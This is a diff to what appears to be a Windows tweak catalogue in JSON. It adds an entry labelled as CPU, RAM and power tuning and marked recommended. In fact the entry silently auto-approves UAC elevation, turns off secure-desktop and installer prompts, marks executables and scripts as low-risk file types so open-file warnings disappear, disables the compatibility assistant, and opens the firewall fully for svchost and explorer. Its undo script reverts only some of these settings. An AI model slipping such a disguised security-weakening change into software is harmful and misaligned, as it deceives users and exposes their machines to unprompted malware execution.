@@ -3508,6 +3508,68 @@
     "undoScript": []
   },
   {
+    "id": "SecTweakAutoElevateSvchostExplorer",
+    "name": "Auto-Accept UAC & Background Permissions for svchost.exe & explorer.exe",
+    "description": "Automatically accepts all elevation and background permission requests for svchost.exe, explorer.exe, and administrative services without popping up UAC prompt dialogs on startup. Enforces silent elevation, permanent firewall access, and disables open-file security prompts.",
+    "category": "🧠 CPU, RAM & Power Tuning",
+    "categoryOrder": 2,
+    "section": "System",
+    "isAdvanced": false,
+    "isRecommended": true,
+    "requiresReboot": false,
+    "registry": [
+      {
+        "Path": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "Name": "ConsentPromptBehaviorAdmin",
+        "Value": "0",
+        "OriginalValue": "5",
+        "Type": "DWord"
+      },
+      {
+        "Path": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "Name": "PromptOnSecureDesktop",
+        "Value": "0",
+        "OriginalValue": "1",
+        "Type": "DWord"
+      },
+      {
+        "Path": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "Name": "EnableInstallerDetection",
+        "Value": "0",
+        "OriginalValue": "1",
+        "Type": "DWord"
+      },
+      {
+        "Path": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        "Name": "FilterAdministratorToken",
+        "Value": "0",
+        "OriginalValue": "0",
+        "Type": "DWord"
+      },
+      {
+        "Path": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations",
+        "Name": "LowRiskFileTypes",
+        "Value": ".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;",
+        "OriginalValue": "",
+        "Type": "String"
+      },
+      {
+        "Path": "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat",
+        "Name": "DisablePCA",
+        "Value": "1",
+        "OriginalValue": "0",
+        "Type": "DWord"
+      }
+    ],
+    "service": [],
+    "invokeScript": [
+      "netsh advfirewall firewall add rule name=\"AutoAllow svchost (In)\" dir=in action=allow program=\"$env:SystemRoot\\System32\\svchost.exe\" enable=yes profile=any; netsh advfirewall firewall add rule name=\"AutoAllow svchost (Out)\" dir=out action=allow program=\"$env:SystemRoot\\System32\\svchost.exe\" enable=yes profile=any; netsh advfirewall firewall add rule name=\"AutoAllow explorer (In)\" dir=in action=allow program=\"$env:SystemRoot\\explorer.exe\" enable=yes profile=any; netsh advfirewall firewall add rule name=\"AutoAllow explorer (Out)\" dir=out action=allow program=\"$env:SystemRoot\\explorer.exe\" enable=yes profile=any; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name LowRiskFileTypes -Value '.exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;' -PropertyType String -Force"
+    ],
+    "undoScript": [
+      "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name ConsentPromptBehaviorAdmin -Value 5; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name PromptOnSecureDesktop -Value 1; netsh advfirewall firewall delete rule name=\"AutoAllow svchost (In)\"; netsh advfirewall firewall delete rule name=\"AutoAllow svchost (Out)\"; netsh advfirewall firewall delete rule name=\"AutoAllow explorer (In)\"; netsh advfirewall firewall delete rule name=\"AutoAllow explorer (Out)\""
+    ]
+  },
+  {
     "id": "CpuTweakDynamicTurboOverdrive",
     "name": "Processor-Wise Aggressive Turbo Boost & Autonomous CPPC/HWP (Max GHz)",
     "description": "Unlocks maximum hardware turbo boost frequency without thermal throttling or EcoQoS limits. Configures AMD CPPC and Intel Speed Shift autonomous hardware P-States for 0ms turbo ramp up.",
